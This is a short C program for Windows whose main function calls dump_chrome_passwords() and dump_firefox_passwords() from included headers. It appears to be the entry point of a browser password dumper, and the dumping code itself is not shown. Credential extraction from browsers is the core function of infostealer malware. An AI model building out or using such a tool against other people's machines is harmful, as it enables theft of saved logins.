#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include "chrome.h"
#include "firefox.h"

int main(int argc, char** argv)
{
	dump_chrome_passwords();
	dump_firefox_passwords();
	return EXIT_SUCCESS;
}